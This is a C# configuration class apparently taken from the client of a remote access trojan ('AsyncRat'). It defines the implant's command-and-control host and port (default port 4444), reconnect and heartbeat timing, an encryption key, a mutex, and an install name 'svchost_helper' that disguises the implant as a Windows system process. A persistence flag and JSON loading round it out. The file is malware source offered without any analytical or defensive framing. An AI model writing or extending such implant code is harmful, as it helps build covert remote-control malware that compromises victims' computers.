using System.Text.Json;
using System.Text.Json.Serialization;

namespace AsyncRat.Client.Config;

public sealed class ImplantConfig
{
    [JsonPropertyName("host")]
    public string Host { get; set; } = "127.0.0.1";

    [JsonPropertyName("port")]
    public int Port { get; set; } = 4444;

    [JsonPropertyName("mutex")]
    public string Mutex { get; set; } = "Global_implant_mtx";

    [JsonPropertyName("reconnect_delay_ms")]
    public int ReconnectDelayMs { get; set; } = 5000;

    [JsonPropertyName("heartbeat_interval_ms")]
    public int HeartbeatIntervalMs { get; set; } = 30_000;

    [JsonPropertyName("encryption_key_hex")]
    public string EncryptionKeyHex { get; set; } = "0000000000000000000000000000000000000000000000000000000000000000";

    [JsonPropertyName("install_name")]
    public string InstallName { get; set; } = "svchost_helper";

    [JsonPropertyName("persistence")]
    public bool EnablePersistence { get; set; }

    public void Validate()
    {
        if (string.IsNullOrWhiteSpace(Host))
            throw new ArgumentException("Host is required");
        if (Port is < 1 or > 65535)
            throw new ArgumentException("Port must be 1-65535");
        if (EncryptionKeyHex.Length != 64)
            throw new ArgumentException("Encryption key must be 64 hex chars (32 bytes)");
    }

    public string ToJson() =>
        JsonSerializer.Serialize(this, new JsonSerializerOptions { WriteIndented = true });

    public static ImplantConfig FromJson(string json) =>
        JsonSerializer.Deserialize<ImplantConfig>(json)
            ?? throw new FormatException("Invalid implant config JSON");

    public static ImplantConfig Default => new();
}
